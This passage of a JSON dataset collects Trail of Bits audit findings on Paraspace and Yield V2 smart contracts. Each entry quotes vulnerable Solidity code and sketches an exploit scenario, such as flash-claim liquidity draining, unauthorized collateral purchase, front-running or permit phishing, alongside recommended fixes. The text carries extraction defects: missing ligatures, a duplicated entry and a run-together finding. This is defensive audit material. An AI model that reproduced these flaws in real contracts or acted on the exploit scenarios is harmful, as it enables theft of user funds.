            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "14. Uniswap v3 NFT ash claims may lead to undercollateralization ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "description": "Flash claims enable users with collateralized NFTs to assume ownership of the underlying asset for the duration of a single transaction, with the condition that the NFT be returned at the end of the transaction. When used with typical NFTs, such as Bored Ape Yacht Club tokens, the atomic nature of ash claims prevents users from removing net value from the Paraspace contract while enabling them to claim rewards, such as airdrops, that they are entitled to by virtue of owning the NFTs. Uniswap v3 NFTs represent a position in a Uniswap liquidity pool and entitle the owner to add or withdraw liquidity from the underlying Uniswap position. Uniswap v3 NFT prices are determined by summing the value of the two ERC20 tokens deposited as liquidity in the underlying position. Normally, when a Uniswap NFT is deposited in the Uniswap NToken contract, the user can withdraw liquidity only if the resulting price leaves the users health factor above one. However, by leveraging the ash claim system, a user could claim the Uniswap v3 NFT temporarily and withdraw liquidity directly, returning a valueless NFT. As currently implemented, Paraspace is not vulnerable to this attack because Uniswap v3 ash claims are, apparently accidentally, nonfunctional. A check in the onERC721Recieved function of the NTokenUniswapV3 contract, which is designed to prevent users from depositing Uniswap positions via the supplyERC721 method, incidentally prevents Uniswap NFTs from being returned to the contract during the ash claim process. However, this check could be removed in future updates and occurs at the very last step in what would otherwise be a successful exploit. function onERC721Received( address operator, address, uint256 id, bytes memory ) external virtual override returns (bytes4) { // ... // if the operator is the pool, this means that the pool is transferring the token to this contract // which can happen during a normal supplyERC721 pool tx if (operator == address(POOL)) { revert(Errors.OPERATION_NOT_SUPPORTED); } Figure 14.1: The failing check that prevents the completion of Uniswap v3 ash claims Exploit Scenario Alice, a Paraspace developer, decides to move the check that prevents users from depositing Uniswap v3 NFTs via the supplyERC721 method out of the onERC721Received function and into the Paraspace Pool contract. She thus unwittingly enables ash claims for Uniswap v3 positions. Bob, a malicious actor, then deposits a Uniswap NFT worth 100 ETH and borrows 30 ETH against it. Bob ash claims the NFT and withdraws the 100 ETH of liquidity, leaving a worthless NFT as collateral and taking the 30 ETH as prot. Recommendations Short term, disable Uniswap v3 NFT ash claims explicitly by requiring in ValidationLogic.validateFlashClaim that the ash claimed NFT not be atomically priced. Long term, consider adding a user healthFactor check after the return phase of the ash claim process to ensure that users cannot become undercollateralized as a result of ash claims.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "15. Non-injective hash encoding in getClaimKeyHash ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "description": "As part of the ash claim functionality, Paraspace provides an implementation of a contract that can claim airdrops on behalf of NFT holders. This contract tracks claimed airdrops in the airdropClaimRecords mapping, indexed by the result of the getClaimKeyHash function. However, it is possible for two dierent inputs to getClaimKeyHash to result in identical hashes through a collision in the unpacked encoding. Because nftTokenIds and params are both variable-length inputs, an input with nftTokenIds equal to uint256(1) and an empty params will hash to the same value as an input with an empty nftTokenIds and params equal to uint256(1). Although the airdropClaimRecords mapping is not read or otherwise referenced elsewhere in the code, collisions may cause o-chain clients to mistakenly believe that an unclaimed airdrop has already been claimed. function getClaimKeyHash( address initiator, address nftAsset, uint256[] calldata nftTokenIds, bytes calldata params ) public pure returns (bytes32) { return keccak256( abi.encodePacked(initiator, nftAsset, nftTokenIds, params) ); } Figure 15.1: contracts/misc/flashclaim/AirdropFlashClaimReceiver.sol#L247257 Exploit Scenario Paraspace develops an o-chain tool to help users automatically claim airdrops for their NFTs. By chance or through malfeasance, two dierent airdrop claim operations for the same nftAsset result in the same claimKeyHash. The tool then mistakenly believes that it has claimed both airdrops when, in reality, it claimed only one. Recommendations Short term, encode the input to keccak256 using abi.encode in order to preserve boundaries between inputs. Long term, consider using an EIP-712 compatible structured hash encoding with domain separation wherever hashes will be used as unique identiers or signed messages.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Lack of contract existence check on delegatecall may lead to unexpected behavior ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "description": "The Ladle contract uses the delegatecall proxy pattern. If the implementation contract is incorrectly set or is self-destructed, the contract may not detect failed executions. The Ladle contract implements the batch and moduleCall functions; users invoke the former to execute batched calls within a single transaction and the latter to make a call to an external module. Neither function performs a contract existence check prior to executing a delegatecall. Figure 1.1 shows the moduleCall function. /// @dev Allow users to use functionality coded in a module, to be used with batch /// @notice Modules must not do any changes to the vault (owner, seriesId, ilkId), /// it would be disastrous in combination with batch vault caching function moduleCall(address module, bytes calldata data) external payable returns (bytes memory result) { } require (modules[module], \"Unregistered module\"); bool success; (success, result) = module.delegatecall(data); if (!success) revert(RevertMsgExtractor.getRevertMsg(result)); Figure 1.1: vault-v2/contracts/Ladle.sol#L186-L197 An external modules address must be registered by an administrator before the function calls that module. /// @dev Add or remove a module. function addModule(address module, bool set) external 15 Yield V2 auth modules[module] = set; emit ModuleAdded(module, set); { } Figure 1.2: vault-v2/contracts/Ladle.sol#L143-L150 If the administrator sets the module to an incorrect address or to the address of a contract that is subsequently destroyed, a delegatecall to it will still return success. This means that if one call in a batch does not execute any code, it will still appear to have been successful, rather than causing the entire batch to fail. The Solidity documentation includes the following warning: The low-level functions call, delegatecall and staticcall return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 1.3: A snippet of the Solidity documentation detailing unexpected behavior related to delegatecall Exploit Scenario Alice, a privileged member of the Yield team, accidentally sets a module to an incorrect address. Bob, a user, invokes the moduleCall method to execute a batch of calls. Despite Alices mistake, the delegatecall returns success without making any state changes or executing any code. Recommendations Short term, implement a contract existence check before a delegatecall. Document the fact that using suicide or selfdestruct can lead to unexpected behavior, and prevent future upgrades from introducing these functions. Long term, carefully review the Solidity documentation, especially the Warnings section, and the pitfalls of using the delegatecall proxy pattern. 16 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Use of delegatecall in a payable function inside a loop ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "description": "The Ladle contract uses the delegatecall proxy pattern (which takes user-provided call data) in a payable function within a loop. This means that each delegatecall within the for loop will retain the msg.value of the transaction: /// @dev Allows batched call to self (this contract). /// @param calls An array of inputs for each call. function batch(bytes[] calldata calls) external payable returns(bytes[] memory results) { results = new bytes[](calls.length); for (uint256 i; i < calls.length; i++) { (bool success, bytes memory result) = address(this).delegatecall(calls[i]); if (!success) revert(RevertMsgExtractor.getRevertMsg(result)); results[i] = result; } // build would have populated the cache, this deletes it cachedVaultId = bytes12(0); } Figure 2.1: vault-v2/contracts/Ladle.sol#L186-L197 The protocol does not currently use the msg.value in any meaningful way. However, if a future version or refactor of the core protocol introduced a more meaningful use of it, it could be exploited to tamper with the system arithmetic. Exploit Scenario Alice, a member of the Yield team, adds a new functionality to the core protocol that adjusts users balances according to the msg.value. Eve, an attacker, uses the batching functionality to increase her ETH balance without actually sending funds from her account, thereby stealing funds from the system. 17 Yield V2 Recommendations Short term, document the risks associated with the use of msg.value and ensure that all developers are aware of this potential attack vector. Long term, detail the security implications of all functions in both the documentation and the code to ensure that potential attack vectors do not become exploitable when code is refactored or added. References  Two Rights Might Make a Wrong, Paradigm 18 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Lack of two-step process for critical operations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "description": "The _give function in the Cauldron contract transfers the ownership of a vault in a single step. There is no way to reverse a one-step transfer of ownership to an address without an owner (i.e., an address with a private key not held by any user). This would not be the case if ownership were transferred through a two-step process in which an owner proposed a transfer and the prospective recipient accepted it. /// @dev Transfer a vault to another user. function _give(bytes12 vaultId, address receiver) internal returns(DataTypes.Vault memory vault) { } require (vaultId != bytes12(0), \"Vault id is zero\"); vault = vaults[vaultId]; vault.owner = receiver; vaults[vaultId] = vault; emit VaultGiven(vaultId, receiver); Figure 3.1: vault-v2/contracts/Cauldron.sol#L227-L237 Exploit Scenario Alice, a Yield Protocol user, transfers ownership of her vault to her friend Bob. When entering Bobs address, Alice makes a typo. As a result, the vault is transferred to an address with no owner, and Alices funds are frozen. Recommendations Short term, use a two-step process for ownership transfers. Additionally, consider adding a zero-value check of the receivers address to ensure that vaults cannot be transferred to the zero address. Long term, use a two-step process for all irrevocable critical operations. 19 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Risks associated with use of ABIEncoderV2 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "description": "The contracts use Soliditys ABIEncoderV2, which is enabled by default in Solidity version 0.8. This encoder has caused numerous issues in the past, and its use may still pose risks. More than 3% of all GitHub issues for the Solidity compiler are related to current or former experimental features, primarily ABIEncoderV2, which was long considered experimental. Several issues and bug reports are still open and unresolved. ABIEncoderV2 has been associated with more than 20 high-severity bugs, some of which are so recent that they have not yet been included in a Solidity release. For example, in March 2019 a severe bug introduced in Solidity 0.5.5 was found in the encoder. Exploit Scenario The Yield Protocol smart contracts are deployed. After the deployment, a bug is found in the encoder, which means that the contracts are broken and can all be exploited in the same way. Recommendations Short term, use neither ABIEncoderV2 nor any experimental Solidity feature. Refactor the code such that structs do not need to be passed to or returned from functions. Long term, integrate static analysis tools like Slither into the continuous integration pipeline to detect unsafe pragmas. 20 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Project dependencies contain vulnerabilities ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "description": "Although dependency scans did not yield a direct threat to the project under review, yarn audit identied dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repositories under review. The output below details these issues. NPM Advisory",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Witchs buy and payAll functions allow users to buy collateral from vaults not undergoing auctions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "description": "The buy and payAll functions in the Witch contract enable users to buy collateral at an auction. However, neither function checks whether there is an active auction for the collateral of a vault. As a result, anyone can buy collateral from any vault. This issue also creates an arbitrage opportunity, as the collateral of an overcollateralized vault can be bought at a below-market price. An attacker could drain vaults of their funds and turn a prot through repeated arbitrage. Exploit Scenario Alice, a user of the Yield Protocol, opens an overcollateralized vault. Attacker Bob calls payAll on Alices vault. As a result, Alices vault is liquidated, and she loses the excess collateral (the portion that made the vault overcollateralized). Recommendations Short term, ensure that buy and payAll fail if they are called on a vault for which there is no active auction. Long term, ensure that all functions revert if the system is in a state in which they are not allowed to be called. 22 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "description": "The Yield Protocol V2 contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the Yield Protocol V2 contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity. 23 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Risks associated with EIP-2612 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "description": "The use of EIP-2612 increases the risk of permit function front-running as well as phishing attacks. EIP-2612 uses signatures as an alternative to the traditional approve and transferFrom ow. These signatures allow a third party to transfer tokens on behalf of a user, with verication of a signed message. The use of EIP-2612 makes it possible for an external party to front-run the permit function by submitting the signature rst. Then, since the signature has already been used and the funds have been transferred, the actual caller's transaction will fail. This could also aect external contracts that rely on a successful permit() call for execution. EIP-2612 also makes it easier for an attacker to steal a users tokens through phishing by asking for signatures in a context unrelated to the Yield Protocol contracts. The hash message may look benign and random to the user. Exploit Scenario Bob has 1,000 iTokens. Eve creates an ERC20 token with a malicious airdrop called ProofOfSignature. To claim the tokens, participants must sign a hash. Eve generates a hash to transfer 1,000 iTokens from Bob. Eve asks Bob to sign the hash to get free tokens. Bob signs the hash, and Eve uses it to steal Bobs tokens. Recommendations Short term, develop user documentation on edge cases in which the signature-forwarding process can be front-run or an attacker can steal a users tokens via phishing. Long term, document best practices for Yield Protocol users. In addition to taking other precautions, users must do the following:  Be extremely careful when signing a message  Avoid signing messages from suspicious sources 24 Yield V2  Always require hashing schemes to be public References  EIP-2612 Security Considerations 25 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Failure to use the batched transaction ow may enable theft through front-running ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "description": "The Yield Protocol relies on users interacting with the Ladle contract to batch their transactions (e.g., to transfer funds and then mint/burn the corresponding tokens in the same series of transactions). When they deviate from the batched transaction ow, users may lose their funds through front-running. For example, an attacker could front-run the startPool() function to steal the initial mint of strategy tokens. The function relies on liquidity provider (LP) tokens to be transferred to the Strategy contract and then used to mint strategy tokens. The rst time that strategy tokens are minted, they are minted directly to the caller: /// @dev Start the strategy investments in the next pool /// @notice When calling this function for the first pool, some underlying needs to be transferred to the strategy first, using a batchable router. function startPool() external poolNotSelected { [...] // Find pool proportion p = tokenReserves/(tokenReserves + fyTokenReserves) // Deposit (investment * p) base to borrow (investment * p) fyToken // (investment * p) fyToken + (investment * (1 - p)) base = investment // (investment * p) / ((investment * p) + (investment * (1 - p))) = p // (investment * (1 - p)) / ((investment * p) + (investment * (1 - p))) = 1 - p uint256 baseBalance = base.balanceOf(address(this)); 26 Yield V2 require(baseBalance > 0, \"No funds to start with\"); uint256 baseInPool = base.balanceOf(address(pool_)); uint256 fyTokenInPool = fyToken_.balanceOf(address(pool_)); uint256 baseToPool = (baseBalance * baseInPool) / (baseInPool + fyTokenInPool); // Rounds down uint256 fyTokenToPool = baseBalance - baseToPool; // fyTokenToPool is rounded up // Mint fyToken with underlying base.safeTransfer(baseJoin, fyTokenToPool); fyToken.mintWithUnderlying(address(pool_), fyTokenToPool); // Mint LP tokens with (investment * p) fyToken and (investment * (1 - p)) base base.safeTransfer(address(pool_), baseToPool); (,, cached) = pool_.mint(address(this), true, 0); // We don't care about slippage, because the strategy holds to maturity and profits from sandwiching if (_totalSupply == 0) _mint(msg.sender, cached); // Initialize the strategy if needed invariants[address(pool_)] = pool_.invariant(); // Cache the invariant to help the frontend calculate profits emit PoolStarted(address(pool_)); } Figure 9.1: strategy-v2/contracts/Strategy.sol#L146-L194 Exploit Scenario Bob adds underlying tokens to the Strategy contract without using the router. Governance calls setNextPool() with a new pool address. Eve, an attacker, front-runs the call to the startPool() function to secure the strategy tokens initially minted for Bobs underlying tokens. Recommendations Short term, to limit the impact of function front-running, avoid minting tokens to the callers of the protocols functions. 27 Yield V2 Long term, document the expectations around the use of the router to batch transactions; that way, users will be aware of the front-running risks that arise when it is not used. Additionally, analyze the implications of all uses of msg.sender in the system, and ensure that users cannot leverage it to obtain tokens that they do not deserve; otherwise, they could be incentivized to engage in front-running. 28 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "10. Strategy contracts balance-tracking system could facilitate theft ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "description": "Strategy contract functions use the contracts balance to determine how many liquidity or base tokens to provide to a user minting or burning tokens. The Strategy contract inherits from the ERC20Rewards contract, which denes a reward token and a reward distribution schedule. An admin must send reward tokens to the Strategy contract to fund its reward payouts. This ow relies on an underlying assumption that the reward token will be dierent from the base token. /// @dev Set a rewards token. /// @notice Careful, this can only be done once. function setRewardsToken(IERC20 rewardsToken_) external auth { } require(rewardsToken == IERC20(address(0)), \"Rewards token already set\"); rewardsToken = rewardsToken_; emit RewardsTokenSet(rewardsToken_); Figure 10.1: yield-utils-v2/contracts/token/ERC20Rewards.sol#L58-L67 The burnForBase() function tracks the Strategy contracts base token balance. If the base token is used as the reward token, the contracts base token balance will be inated to include the reward token balance (and the balance tracked by the function will be incorrect). As a result, when attempting to burn strategy tokens, a user may receive more base tokens than he or she deserves for the number of strategy tokens being burned: /// @dev Burn strategy tokens to withdraw base tokens. It can be called only when a pool is not selected. 29 Yield V2 /// @notice The strategy tokens that the user burns need to have been transferred previously, using a batchable router. function burnForBase(address to) external poolNotSelected returns (uint256 withdrawal) { } // strategy * burnt/supply = withdrawal uint256 burnt = _balanceOf[address(this)]; withdrawal = base.balanceOf(address(this)) * burnt / _totalSupply; _burn(address(this), burnt); base.safeTransfer(to, withdrawal); Figure 10.2: strategy-v2/contracts/Strategy.sol#L258-L271 Exploit Scenario Bob deploys the Strategy contract; DAI is set as a base token of that contract and is also dened as the reward token in the ERC20Rewards contract. After a pool has ocially been closed, Eve uses burnWithBase() to swap base tokens for strategy tokens. Because the calculation takes into account the base tokens balance, she receives more base tokens than she should. Recommendations Short term, add checks to verify that the reward token is not set to the base token, liquidity token, fyToken, or strategy token. These checks will ensure that users cannot leverage contract balances that include reward token balances to turn a prot. Long term, analyze all token interactions in the contract to ensure they do not introduce unexpected behavior into the system. 30 Yield V2 11. Insu\u0000cient protection of sensitive keys Severity: Medium Diculty: High Type: Conguration Finding ID: TOB-YP2-011 Target: hardhat.config.js",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "12. Lack of limits on the total amount of collateral sold at auction ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "description": "MakerDAOs Dutch auction system imposes limits on the amount of collateral that can be auctioned o at once (both the total amount and the amount of each collateral type). If the MakerDAO system experienced a temporary oracle failure, these limits would prevent a catastrophic loss of all collateral. The Yield Protocol auction system is similar to MakerDAOs but lacks such limits, meaning that all of its collateral could be auctioned o for below-market prices. Exploit Scenario The oracle price feeds (or other components of the system) experience an attack or another issue. The incident causes a majority of the vaults to become undercollateralized, triggering auctions of those vaults collateral. The protocol then loses the majority of its collateral, which is auctioned o for below-market prices, and enters an undercollateralized state from which it cannot recover. Recommendations Short term, introduce global and type-specic limits on the amount of collateral that can be auctioned o at the same time. Ensure that these limits protect the protocol from total liquidation caused by bugs while providing enough liquidation throughput to accommodate all possible price changes. Long term, wherever possible, introduce limits for the systems variables to ensure that they remain within the expected ranges. These limits will minimize the impact of bugs or attacks against the system. 33 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Lack of incentives for calls to Witch.auction ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "description": "Users call the Witch contracts auction function to start auctions for undercollateralized vaults. To reduce the losses incurred by the protocol, this function should be called as soon as possible after a vault has become undercollateralized. However, the Yield Protocol system does not provide users with a direct incentive to call Witch.auction. By contrast, the MakerDAO system provides rewards to users who initialize auctions. Exploit Scenario A stock market crash triggers a crypto market crash. The numerous corrective arbitrage transactions on the Ethereum network cause it to become congested, and gas prices skyrocket. To keep the Yield Protocol overcollateralized, many undercollateralized vaults must be auctioned o. However, because of the high price of calls to Witch.auction, and the lack of incentives for users to call it, too few auctions are timely started. As a result, the system incurs greater losses than it would have if more auctions had been started on time. Recommendations Short term, reward those who call Witch.auction to incentivize users to call the function (and to do so as soon as possible). Long term, ensure that users are properly incentivized to perform all important operations in the protocol. 34 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "14. Contracts used as dependencies do not track upstream changes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "description": "Math64x64 has been copied and pasted into the yieldspace-v2 repository. The code documentation does not specify the exact revision that was made or whether the code was modied. As such, the contracts will not reliably reect updates or security xes implemented in this dependency, as those changes must be manually integrated into the contracts. Exploit Scenario Math64x64 receives an update with a critical x for a vulnerability. An attacker detects the use of a vulnerable contract and can then exploit the vulnerability against any of the Yield Protocol contracts that use Math64x64. Recommendations Short term, review the codebase and document the source and version of the dependency. Include third-party sources as submodules in your Git repositories to maintain internal path consistency and ensure that any dependencies are updated periodically. Long term, use an Ethereum development environment and NPM to manage packages in the project. 35 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "15. Cauldrons give and tweak functions lack vault existence checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "description": "The Cauldron depends on the caller (the Ladle) to perform a check that is critical to the internal consistency of the Cauldron. The Cauldron should provide an API that makes the creation of malformed vaults impossible. The Cauldron contracts give(vaultId, receiver) function does not check whether the vaultId passed to it is associated with an existent vault. If the ID is not that of an existent vault, the protocol will create a new vault, with the owner set to receiver and all other elds set to zero. The existence of such a malformed vault could have negative consequences for the protocol. For example, the build function checks the existence of a vault by verifying that vault.seriesId is not zero. The build function could be abused to set the seriesId and ilkId of a malformed vault. The Cauldrons tweak function also fails to check the existence of the vault it operates on and can be used to create a vault without an owner. function _give(bytes12 vaultId, address receiver) internal returns(DataTypes.Vault memory vault) { } require (vaultId != bytes12(0), \"Vault id is zero\"); vault = vaults[vaultId]; vault.owner = receiver; vaults[vaultId] = vault; emit VaultGiven(vaultId, receiver); /// @dev Transfer a vault to another user. function give(bytes12 vaultId, address receiver) external auth returns(DataTypes.Vault memory vault) 36 Yield V2 { } vault = _give(vaultId, receiver); Figure 15.1: The give and _give functions in the Cauldron contract (vault-v2/contracts/Cauldron.sol#L228-L246) Exploit Scenario Bob, a Yield Protocol developer, adds a new public function that calls Cauldron.give and does not perform a vault existence check. Any user can call the function to create a malformed vault, with unclear consequences for the protocol. Recommendations Short term, ensure that the protocol performs zero-value checks for all values that should not be set to zero. Long term, follow the guidance on data validation laid out in TOB-YP2-016. 37 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "16. Problematic approach to data validation and access controls ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "description": "Many parts of the codebase lack data validation. The Yield team indicated that these omissions were largely intentional, as it is the responsibility of the front end of other contracts to ensure that data is valid. The codebase lacks zero-value checks for the following parameters (among others):  The parameters of LadleStorage.constructor  The receiver parameter of Cauldron._give  The parameters of Ladle.give  The to parameter of Pool.buyBase and Pool.sellBase  The oracle parameter of Cauldron.setLendingOracle and Cauldron.setSpotOracle  The owner parameter of Cauldron.build  The value parameter of FYToken.point  The parameters of Witch.constructor It also lacks zero-value checks for the module parameter of Ladle.moduleCall and Ladle.addModule, and the moduleCall and addModule functions do not perform contract existence checks. Moreover, many functions do not contain exhaustive data validation and instead rely on their caller or callee to partially handle data validation. As a result, the protocols data validation is spread across multiple functions and, in certain cases, across multiple contracts. For example, the Cauldron contracts give and tweak functions (likely among others) require the caller, which is usually the Ladle, to check the existence of the vault being modied. The Ladle is therefore responsible for ensuring the integrity of the Cauldrons internal data. This diuse system of data validation requires developers and auditors to increase their focus on the context of a call, making their work more dicult. More importantly, though, it makes the code less robust. Developers cannot modify a function in isolation; instead, they 38 Yield V2 have to look at all call sites to ensure that required validation is performed. This process is error-prone and increases the likelihood that high-severity issues (like that described in TOB-YP2-006) will be introduced into the system. The deduplication of these checks (such that data validation occurs only once per call stack) is not a secure coding practice; nor is the omission of data validation. We strongly believe that code intended to securely handle millions of dollars in assets should be developed using the most secure coding practices possible. The protocols micro-optimizations do not appear to have any benets beyond a reduction in gas costs. However, these savings are minor. For example, performing a zero check of a value already on the stack would cost 3 units of gas (see the ISZERO opcode). Even with a fairly high gas price of 200 gwei and an ether price of $3,000, this operation would cost $0.0018. Performing 10 additional zero-value checks per transaction would cost only around 2 cents. Similarly, a read of a value in cold storage would have a gas cost of 2,100 (see the SLOAD opcode); with the values above, that would be about $1.20. Warm access (that is, an additional read operation from the same storage slot within the same transaction) would cost only 100 units of gas, or about 6 cents. We believe the low cost of these checks to be a reasonable price for the increased robustness that would accompany additional data validation. We do not agree that it is best to omit these checks, as the relatively small gas savings come at the expense of defense in depth, which is more important. Exploit Scenario A Yield Protocol developer adds a new function that calls a pre-existing function. This pre-existing function makes implicit assumptions about the data validation that will occur before it is called. However, the developer is not fully aware of these implicit assumptions and accidentally leaves out important data validation, creating an attack vector that can be used to steal funds from the protocol. Recommendations Long term, ensure that the protocols functions perform exhaustive validation of their inputs and of the systems state and that they do not assume that validation has been performed further up in the call stack (or will be performed further down). Such assumptions make the code brittle and increase the likelihood that vulnerabilities will be introduced when the code is modied. Any implicit assumptions regarding data validation or access controls should be explicitly documented; otherwise, modications to the code could break those important assumptions. 39 Yield V2 In general, a contract should not assume that its functions will always be called with valid data or that those calls will be made only when the state of the system allows it. This applies even to functions that can be called only by the protocols contracts, as a protocol contract could be replaced by a malicious version. An additional layer of defense could mitigate the fallout of such a scenario. 40 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "17. isContract may behave unexpectedly ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "description": "The Yield Protocol system relies on the isContract() function in a few of the Solidity les to check whether there is a contract at the target address. However, in Solidity, there is no general way to denitively determine that, as there are several edge cases in which the underlying function extcodesize() can return unexpected results. In addition, there is no way to guarantee that an address that is that of a contract (or one that is not) will remain that way in the future. library IsContract { /// @dev Returns true if `account` is a contract. function isContract(address account) internal view returns (bool) { // This method relies on extcodesize, which returns 0 for contracts in // construction, since the code is only stored at the end of the // constructor execution. return account.code.length > 0; } } Figure 17.1: yield-utils-v2/contracts/utils/IsContract.sol#L6-L14 Exploit Scenario A function, f, within the Yield Protocol codebase calls isContract() internally to guarantee that a certain method is not callable by another contract. An attacker creates a contract that calls f from within its constructor, and the call to isContract() within f returns false, violating the guarantee. Recommendations Short term, clearly document for developers that isContract() is not guaranteed to return an accurate value, and emphasize that it should never be used to provide an assurance of security. Long term, be mindful of the fact that the Ethereum core developers consider it poor practice to attempt to dierentiate between end users and contracts. Try to avoid this practice entirely if possible. 41 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "10. Strategy contracts balance-tracking system could facilitate theft ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "description": "Strategy contract functions use the contracts balance to determine how many liquidity or base tokens to provide to a user minting or burning tokens. The Strategy contract inherits from the ERC20Rewards contract, which denes a reward token and a reward distribution schedule. An admin must send reward tokens to the Strategy contract to fund its reward payouts. This ow relies on an underlying assumption that the reward token will be dierent from the base token. /// @dev Set a rewards token. /// @notice Careful, this can only be done once. function setRewardsToken(IERC20 rewardsToken_) external auth { } require(rewardsToken == IERC20(address(0)), \"Rewards token already set\"); rewardsToken = rewardsToken_; emit RewardsTokenSet(rewardsToken_); Figure 10.1: yield-utils-v2/contracts/token/ERC20Rewards.sol#L58-L67 The burnForBase() function tracks the Strategy contracts base token balance. If the base token is used as the reward token, the contracts base token balance will be inated to include the reward token balance (and the balance tracked by the function will be incorrect). As a result, when attempting to burn strategy tokens, a user may receive more base tokens than he or she deserves for the number of strategy tokens being burned: /// @dev Burn strategy tokens to withdraw base tokens. It can be called only when a pool is not selected. 29 Yield V2 /// @notice The strategy tokens that the user burns need to have been transferred previously, using a batchable router. function burnForBase(address to) external poolNotSelected returns (uint256 withdrawal) { } // strategy * burnt/supply = withdrawal uint256 burnt = _balanceOf[address(this)]; withdrawal = base.balanceOf(address(this)) * burnt / _totalSupply; _burn(address(this), burnt); base.safeTransfer(to, withdrawal); Figure 10.2: strategy-v2/contracts/Strategy.sol#L258-L271 Exploit Scenario Bob deploys the Strategy contract; DAI is set as a base token of that contract and is also dened as the reward token in the ERC20Rewards contract. After a pool has ocially been closed, Eve uses burnWithBase() to swap base tokens for strategy tokens. Because the calculation takes into account the base tokens balance, she receives more base tokens than she should. Recommendations Short term, add checks to verify that the reward token is not set to the base token, liquidity token, fyToken, or strategy token. These checks will ensure that users cannot leverage contract balances that include reward token balances to turn a prot. Long term, analyze all token interactions in the contract to ensure they do not introduce unexpected behavior into the system. 30 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "11. Insu\u0000cient protection of sensitive keys ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
